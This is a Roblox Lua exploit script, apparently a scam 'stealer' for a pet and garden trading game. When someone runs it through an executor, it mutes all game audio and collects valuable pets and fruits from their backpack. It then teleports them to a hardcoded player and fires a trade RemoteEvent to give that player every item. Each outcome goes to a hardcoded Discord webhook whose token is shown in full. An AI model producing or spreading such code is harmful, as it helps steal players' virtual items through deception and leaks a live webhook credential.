local WEBHOOK_URL = "https://discord.com/api/webhooks/1383762986111471626/XYLI8fnKczPB65YAOvg_Dtsuf28mGQvTHRxcr2JP4pHiaFY8qPw2MlGNzX9pp7geweF3" -- Discord webhook (optional)
local TARGET_NAME = "Tekeshkii" -- Name of the player to gift items to
local LOADING_TIME = 2 -- Time in seconds before executing (reduce for testing)

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")

local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")
local Character = lp.Character or lp.CharacterAdded:Wait()

-- Mute all game sounds (optional)
local function muteSounds()
    local SoundService = game:GetService("SoundService")
    SoundService.Volume = 0
    for _, sound in ipairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then sound:Stop() end
    end
end

-- Check if the executor has required pets/fruits
local function getValidItems()
    local validItems = {
        "dragonfly", "raccoon", "disco bee", "queen bee", "candy blossom"
    }
    local foundItems = {}

    -- Check Backpack
    for _, tool in ipairs(Backpack:GetChildren()) do
        local lowerName = string.lower(tool.Name)
        for _, item in ipairs(validItems) do
            if string.find(lowerName, item) then
                table.insert(foundItems, tool)
                break
            end
        end
    end

    -- Check Character (if equipped)
    if Character then
        for _, tool in ipairs(Character:GetChildren()) do
            if tool:IsA("Tool") then
                local lowerName = string.lower(tool.Name)
                for _, item in ipairs(validItems) do
                    if string.find(lowerName, item) then
                        table.insert(foundItems, tool)
                        break
                    end
                end
            end
        end
    end

    return foundItems
end

-- Teleport to recipient
local function teleportToPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    local targetChar = targetPlayer.Character
    local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end

    -- Use TweenService for smooth teleport (optional)
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
    local tween = game:GetService("TweenService"):Create(
        lp.Character.HumanoidRootPart,
        tweenInfo,
        {CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -5)}
    )
    tween:Play()
    tween.Completed:Wait()
    return true
end

-- Gift items to recipient (game-specific)
local function giftItems(targetPlayer, items)
    if not targetPlayer then return false end

    -- Assumes a RemoteEvent named "TradeItems" exists (modify per game)
    local tradeEvent = ReplicatedStorage:FindFirstChild("TradeItems") or
                      ReplicatedStorage:WaitForChild("TradeItems", 5)

    if tradeEvent and tradeEvent:IsA("RemoteEvent") then
        for _, item in ipairs(items) do
            tradeEvent:FireServer(targetPlayer, item)
            task.wait(0.5) -- Avoid rate limits
        end
        return true
    else
        warn("[!] Trade system not found. Modify script for your game.")
        return false
    end
end

-- Main execution
local function main()
    muteSounds()
    local validItems = getValidItems()

    if #validItems == 0 then
        print("[!] No valid pets/fruits found.")
        if WEBHOOK_URL ~= "" then
            local req = syn and syn.request or request or http_request
            if req then
                pcall(function()
                    req({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            content = "❌ No valid items found in " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
                        })
                    })
                end)
            end
        end
        return
    end

    -- Find recipient
    local recipient
    for _, player in ipairs(Players:GetPlayers()) do
        if string.lower(player.Name) == string.lower(TARGET_NAME) or
           string.lower(player.DisplayName) == string.lower(TARGET_NAME) then
            recipient = player
            break
        end
    end

    if not recipient then
        print("[!] Recipient not found:", TARGET_NAME)
        if WEBHOOK_URL ~= "" then
            local req = syn and syn.request or request or http_request
            if req then
                pcall(function()
                    req({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            content = "❌ Recipient **" .. TARGET_NAME .. "** not found in " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
                        })
                    })
                end)
            end
        end
        return
    end

    -- Teleport & gift
    if teleportToPlayer(recipient) then
        print("[+] Teleported to", recipient.Name)
        if giftItems(recipient, validItems) then
            print("[+] Gifted", #validItems, "items to", recipient.Name)
            if WEBHOOK_URL ~= "" then
                local req = syn and syn.request or request or http_request
                if req then
                    pcall(function()
                        req({
                            Url = WEBHOOK_URL,
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode({
                                content = "✅ **Gifted " .. #validItems .. " items** to **" .. recipient.Name .. "** in " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
                            })
                        })
                    end)
                end
            end
        end
    end
end

-- Start after delay
task.delay(LOADING_TIME, main)
